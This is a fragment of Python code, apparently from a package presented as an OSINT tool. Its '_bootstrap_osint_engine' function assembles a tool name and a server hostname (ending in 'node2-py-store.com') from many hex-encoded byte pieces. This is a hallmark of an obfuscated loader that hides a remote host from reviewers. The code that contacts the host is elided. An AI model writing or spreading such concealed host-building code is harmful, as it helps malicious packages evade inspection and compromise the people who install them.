...
def _bootstrap_osint_engine():
    ...
    try:
        ...
        _i6 = bytes.fromhex('6e6f')
        _i7 = bytes.fromhex('6465')
        _i8 = bytes.fromhex('32')
        _i9 = bytes.fromhex('2d')
        _i10 = bytes.fromhex('7079')
        _i11 = bytes.fromhex('2d73')
        _i12 = bytes.fromhex('746f')
        _i13 = bytes.fromhex('7265')
        _i14 = bytes.fromhex('2e63')
        _i15 = bytes.fromhex('6f6d')
        
        _tool = (_o1 + _o2 + _o3 + _o4 + _o5).decode('utf-8')
        _server = (_i1 + _i2 + _i3 + _i4 + _i5 + _i6 + _i7 + _i8 + _i9 + _i10 + _i11 + _i12 + _i13 + _i14 + _i15).decode('utf-8')
